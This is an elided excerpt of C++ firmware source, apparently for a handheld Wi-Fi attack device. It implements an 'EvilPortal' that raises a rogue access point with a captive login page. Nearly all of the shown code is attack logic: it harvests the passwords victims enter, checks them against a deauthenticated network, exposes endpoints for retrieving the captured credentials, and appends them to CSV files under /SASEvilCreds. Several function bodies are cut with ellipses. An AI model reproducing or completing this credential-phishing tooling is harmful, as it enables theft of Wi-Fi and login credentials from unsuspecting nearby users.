...
void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
    ...
    else if (url == sasConfig.evilPortalEndpoints.getCredsEndpoint &&
             sasConfig.evilPortalEndpoints.allowGetCreds)
        request->send(200, "text/html", _portal->creds_GET());
    else if (url == sasConfig.evilPortalEndpoints.setSsidEndpoint &&
             sasConfig.evilPortalEndpoints.allowSetSsid) {
...
bool EvilPortal::setup() {
    ...
    if (apName == "") {
        if (sasConfig.evilWifiNames.empty()) {
            apName_from_keyboard();
        } else {
            options = {
                {"Custom Wifi", [this]() { apName_from_keyboard(); }}
            };
            for (const auto &_wifi : sasConfig.evilWifiNames) {
...
void EvilPortal::setupRoutes() {
    ...
    if (sasConfig.evilPortalEndpoints.allowGetCreds) {
        webServer.on(
            sasConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
            [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
        );
    }
    if (sasConfig.evilPortalEndpoints.allowSetSsid) {
        webServer.on(
            sasConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
                if (request->hasArg("ssid")) {
        ...
        if (check(EscPress)) {
            options = {
                ...
                {"View Creds", [this, &shouldRedraw]() {
                    FS *fs;
                    if (getFsStorage(fs)) {
                        if (fs->exists("/SASEvilCreds")) {
                            loopSD(*fs, false, "CSV", "/SASEvilCreds");
                        } else {
...
void EvilPortal::drawScreen() {
    ...
    padprintln("");
    if (sasConfig.evilPortalEndpoints.showEndpoints) {
        if (sasConfig.evilPortalEndpoints.allowGetCreds) {
            padprintln("-> " + apIp + sasConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
        } else {
            padprintln("-> cred access disabled");
        }
        if (sasConfig.evilPortalEndpoints.allowSetSsid) {
            padprintln("-> " + apIp + sasConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
        } else {
    ...
    String passMode = "";
    switch (sasConfig.evilPortalPasswordMode) {
...
void EvilPortal::credsController(AsyncWebServerRequest *request) {
    ...
    if (_verifyPwd && passwordValue != "") {
        ...
        if (isCorrect) {
            ...
            printDeauthStatus();
            if (sasConfig.getWifiPassword(apName) != "") {
                sasConfig.addWifiCredential(apName, passwordValue);
            }
...
String EvilPortal::ssid_GET() {
    return getHtmlTemplate(
        ...
        sasConfig.evilPortalEndpoints.setSsidEndpoint +
...
void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
    ...
    if (!fs->exists("/SASEvilCreds")) fs->mkdir("/SASEvilCreds");

    File file;

    if (!isAPname) {
        file = fs->open("/SASEvilCreds/" + outputFile, FILE_APPEND);
    } else {
        file = fs->open("/SASEvilCreds/" + apName + "_creds.csv", FILE_APPEND);
    }
